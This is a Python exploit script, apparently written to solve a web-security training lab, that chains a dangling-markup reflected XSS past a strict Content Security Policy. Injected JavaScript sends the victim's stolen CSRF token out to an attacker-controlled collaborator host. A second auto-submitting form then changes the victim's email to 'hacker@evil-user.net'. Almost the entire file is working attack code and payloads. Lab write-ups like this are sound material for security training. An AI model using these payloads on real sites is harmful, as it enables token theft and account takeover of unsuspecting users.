# Reflected XSS protected by very strict CSP, with dangling markup attack

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def send_payload(url, payload, attacker):
	injection_uri = url + payload
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = requests.post(post_exploit_path, data=post_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = requests.post(post_exploit_path, data=post_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r

def send_xss(url, attacker, collab):
	search_path = url + '/'
	xss_payload1 = """"><a href"""
	xss_payload2 = """/exploit">Click</a><base target='"""
	enc_xss_payload1 = urllib.parse.quote(xss_payload1)
	enc_xss_payload2 = urllib.parse.quote(xss_payload2)
	exploit_body = """<script>
if(window.name) {
	new Image().src='//""" + collab + """?'+encodeURIComponent(window.name);
} else {
	location = '""" + url + """/my-account?email=""" + enc_xss_payload1 + '=%22' + attacker + enc_xss_payload2 + """';
}
</script>"""
	r = send_payload(search_path, exploit_body, attacker)
	if r.status_code == 200:
		print('\n[+] Check your Collaborator and grab the CSRF token to continue...')
		csrf = input('Enter the CSRF Token:\n> ')
		exploit_body = """<html>
  <body>
    <form action=\"""" + url + """/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value=\"""" + csrf + """\" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>"""
		print('[+] Trying send a cross-site scripting attack to the victim to change his email...')
		r = send_payload(search_path, exploit_body, attacker)
		return r
	else:
		return False

def main():
	print('[+] Lab: Reflected XSS protected by very strict CSP, with dangling markup attack')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		collab = sys.argv[3].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <ATTACKER> <COLLAB>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com https://xxxxxxxxxxx.exploit-server.net xxxxxxxxxx.oastify.com' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send a cross-site scripting attack to the victim to steal CSRF token...')
		r = send_xss(url, attacker, collab)
		time.sleep(1)
		if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
			print('[+] The lab is solved')
		elif r.status_code == 200:
			print('[+] The Exploit sent the given payload !')
		else:
			print('[-] The Exploit failed <!>')


if __name__ == "__main__":
	main()
